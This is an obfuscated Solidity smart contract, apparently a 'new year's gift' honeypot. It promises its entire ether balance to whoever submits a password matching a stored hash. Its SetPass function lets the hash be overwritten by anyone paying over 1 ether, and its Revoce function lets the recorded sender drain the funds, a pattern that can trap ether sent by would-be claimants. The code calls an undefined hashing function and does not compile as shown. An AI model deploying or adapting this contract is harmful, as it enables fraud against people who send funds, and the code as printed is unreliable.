pragma solidity ^0.4.19;

contract NEW_YEARS_GIFT
{
    string _0xd01336;

    bool _0x3184d7 = false;

    address sender;

    bytes32 public _0xde1ff4;

    function() public payable{}

    function GetHash(bytes _0x2ffb45) public constant returns (bytes32) {return _0x9a5c60(_0x2ffb45);}

    function SetPass(bytes32 _0xee4bd5)
    public
    payable
    {
        if( (!_0x3184d7&&(msg.value > 1 ether)) || _0xde1ff4==0x0 )
        {
            _0xde1ff4 = _0xee4bd5;
            sender = msg.sender;
        }
    }

    function SetMessage(string _0x407f40)
    public
    {
        if(msg.sender==sender)
        {
            _0xd01336 =_0x407f40;
        }
    }

    function GetGift(bytes _0x2ffb45)
    external
    payable
    returns (string)
    {
        if(_0xde1ff4 == _0x9a5c60(_0x2ffb45))
        {
            msg.sender.transfer(this.balance);
            return _0xd01336;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            _0xd01336="";
        }
    }

    function PassHasBeenSet(bytes32 _0xee4bd5)
    public
    {
        if(msg.sender==sender&&_0xee4bd5==_0xde1ff4)
        {
           _0x3184d7=true;
        }
    }
}